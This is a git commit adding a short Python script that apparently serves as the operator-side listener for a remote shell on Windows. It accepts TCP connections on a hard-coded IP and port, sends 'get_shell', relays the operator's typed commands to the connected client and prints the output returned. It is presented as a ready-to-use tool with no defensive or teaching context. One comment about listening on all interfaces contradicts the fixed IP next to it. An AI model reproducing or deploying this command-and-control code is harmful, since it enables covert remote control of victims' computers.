5cd0fdf5b33f40ef1b0822eec6032d34897871ee
cyber communinty <74042135+ankit637@users.noreply.github.com>
2023-08-07 19:26:52 +0530

    server_win.py
    server side code for windows
    this code is only for windows

---
+++ server_win.py
@@ -0,0 +1,32 @@
+import socket
+
+def handle_shell(conn):
+    print("Connected to client. Sending shell request.")
+    conn.send(b"get_shell")  # Send a shell request to the client
+
+    while True:
+        command = input("> ")  # Get a shell command from the server user
+        conn.send(command.encode("utf-8"))  # Send the command to the client
+
+        if command.strip().lower() == 'quit':
+            conn.close()
+            break
+
+        response = conn.recv(4096).decode("utf-8")  # Receive the command output from the client
+        print(response)
+
+def main():
+    bind_ip = "192.168.10.196"  # Listen on all available network interfaces
+    bind_port = 9018
+
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((bind_ip, bind_port))
+    server.listen(5)
+    print("[*] Listening on {}:{}".format(bind_ip, bind_port))
+
+    while True:
+        conn, addr = server.accept()
+        handle_shell(conn)
+
+if __name__ == "__main__":
+    main()
